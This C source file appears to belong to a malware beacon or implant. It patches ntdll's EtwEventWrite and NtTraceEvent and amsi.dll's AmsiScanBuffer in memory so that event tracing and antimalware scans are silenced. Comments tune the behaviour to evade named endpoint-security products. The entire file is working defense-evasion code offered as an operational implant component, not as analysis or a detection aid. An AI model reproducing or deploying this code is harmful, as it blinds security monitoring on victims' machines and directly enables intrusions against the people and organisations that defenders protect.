/* beacon/src/Core/Patch.c
 * P3 — AMSI/ETW userland patches (lane-gated, graceful).
 *
 * Patches userland telemetry hooks at boot, BEFORE the beacon's own library
 * loads (bcrypt/iphlpapi/winhttp) fire userland provider events:
 *   - ntdll!EtwEventWrite  -> 33 C0 C3  (xor eax,eax; ret = STATUS_SUCCESS)
 *   - ntdll!NtTraceEvent   -> 33 C0 C3  (alternate: survives EEW integrity
 *     checks on vendors that re-validate only EtwEventWrite)
 *   - amsi.dll!AmsiScanBuffer -> 31 C0 C3 (xor eax,eax; ret = S_OK/clean)
 *     ONLY when amsi.dll is already loaded in the host (script/office host
 *     delivery). The beacon never LoadLibrarys amsi itself - a native host
 *     loading amsi.dll would be its own anomaly.
 *
 * Scoping note (honest): kernel ETW-TI instrumentation is untouched by any
 * userland patch of this kind - kernel-side syscall/process/file telemetry
 * keeps flowing. This closes ONLY userland provider emission for this
 * process. A process emitting zero userland ETW events is itself a hunting
 * signal, which is why the patch is lane-gated:
 *   NAX_LANE=defender (OSAI/Defender): patch ON (no real userland feed loss
 *     signal there; kernel ETW-TI exists but userland patching lowers the
 *     managed/scripting exposure the AMSI path monitors)
 *   NAX_LANE=elastic (Falcon/Elastic): patch OFF by default (both vendors
 *     detect security-DLL .text patching; the direct-resolve lane already
 *     makes no hooks to defeat)
 *
 * All flips go through NtProtectVirtualMemory (stub-routed on the defender
 * lane) - never RWX, restore original protection after the byte write, and
 * every step fails soft (a missed patch is the pre-P3 behavior, never a
 * crash).
 */

#include "Nax.h"

/* Patch one function: flip the page RW, write the stub, restore protection.
 * Returns TRUE when the bytes now match the requested stub. */
FUNC static BOOL NaxPatchFn( PNAX_INSTANCE Nax, PBYTE fn, const BYTE* stub, UINT32 stub_len ) {
    if ( ! fn || ! stub || ! stub_len )
        return FALSE;

    if ( Nax->Ntdll.NtProtectVirtualMemory ) {
        PVOID  base = (PVOID)fn;
        SIZE_T size = stub_len;
        ULONG  old  = 0;
        if ( ( ( NTSTATUS ( NTAPI* )( HANDLE, PVOID*, PSIZE_T, ULONG, PULONG ) )
               Nax->Ntdll.NtProtectVirtualMemory )( NtCurrentProcess(), &base, &size, PAGE_READWRITE, &old ) != 0 )
            return FALSE;

        volatile BYTE* p = (volatile BYTE*)fn;
        for ( UINT32 i = 0; i < stub_len; i++ )
            p[ i ] = stub[ i ];

        ULONG old2 = 0;
        ( ( NTSTATUS ( NTAPI* )( HANDLE, PVOID*, PSIZE_T, ULONG, PULONG ) )
          Nax->Ntdll.NtProtectVirtualMemory )( NtCurrentProcess(), &base, &size, old, &old2 );

        /* verify */
        for ( UINT32 i = 0; i < stub_len; i++ )
            if ( (BYTE)fn[ i ] != stub[ i ] )
                return FALSE;
        return TRUE;
    }

    /* kernel32 VirtualProtect fallback (elastic lane layout is the same) */
    if ( Nax->Kernel32.VirtualProtect ) {
        DWORD old = 0;
        if ( ! Nax->Kernel32.VirtualProtect( (LPVOID)fn, (SIZE_T)stub_len, PAGE_READWRITE, &old ) )
            return FALSE;
        volatile BYTE* p = (volatile BYTE*)fn;
        for ( UINT32 i = 0; i < stub_len; i++ )
            p[ i ] = stub[ i ];
        DWORD old2 = 0;
        Nax->Kernel32.VirtualProtect( (LPVOID)fn, (SIZE_T)stub_len, old, &old2 );
        for ( UINT32 i = 0; i < stub_len; i++ )
            if ( (BYTE)fn[ i ] != stub[ i ] )
                return FALSE;
        return TRUE;
    }

    return FALSE;
}

/* Verify a function already matches a stub (idempotency across reloads). */
FUNC static BOOL NaxPatchIsApplied( const PBYTE fn, const BYTE* stub, UINT32 stub_len ) {
    if ( ! fn ) return FALSE;
    for ( UINT32 i = 0; i < stub_len; i++ )
        if ( fn[ i ] != stub[ i ] )
            return FALSE;
    return TRUE;
}

FUNC UINT32 NaxEtwAmsiPatch( PNAX_INSTANCE Nax ) {
    UINT32 patched = 0;
    BYTE   clean3[ 3 ];

    /* ntdll!EtwEventWrite -> xor eax,eax; ret */
    clean3[ 0 ] = 0x33; clean3[ 1 ] = 0xC0; clean3[ 2 ] = 0xC3;
    {
        PBYTE fn = (PBYTE)NaxGetProc( Nax->Ntdll.Handle, H_ETWEVENTWRITE );
        if ( fn && ! NaxPatchIsApplied( fn, clean3, 3 ) && NaxPatchFn( Nax, fn, clean3, 3 ) ) {
            patched++;
            NaxDbg( Nax, "[p3] EtwEventWrite patched (%p)", fn );
        }
    }

    /* ntdll!NtTraceEvent -> xor eax,eax; ret */
    {
        PBYTE fn = (PBYTE)NaxGetProc( Nax->Ntdll.Handle, H_NTTRACEEVENT );
        if ( fn && ! NaxPatchIsApplied( fn, clean3, 3 ) && NaxPatchFn( Nax, fn, clean3, 3 ) ) {
            patched++;
            NaxDbg( Nax, "[p3] NtTraceEvent patched (%p)", fn );
        }
    }

    /* amsi.dll!AmsiScanBuffer -> xor eax,eax; ret (only when already loaded) */
    {
        HMODULE hAmsi = NaxGetModule( H_AMSI_DLL );
        if ( hAmsi ) {
            PBYTE fn = (PBYTE)NaxGetProc( hAmsi, H_AMSISCANBUFFER );
            if ( fn ) {
                BYTE  asb[ 3 ];
                asb[ 0 ] = 0x31; asb[ 1 ] = 0xC0; asb[ 2 ] = 0xC3;
                if ( ! NaxPatchIsApplied( fn, asb, 3 ) && NaxPatchFn( Nax, fn, asb, 3 ) ) {
                    patched++;
                    NaxDbg( Nax, "[p3] AmsiScanBuffer patched (%p)", fn );
                }
            }
        }
    }

    NaxDbg( Nax, "[p3] %u patches applied", patched );
    return patched;
}
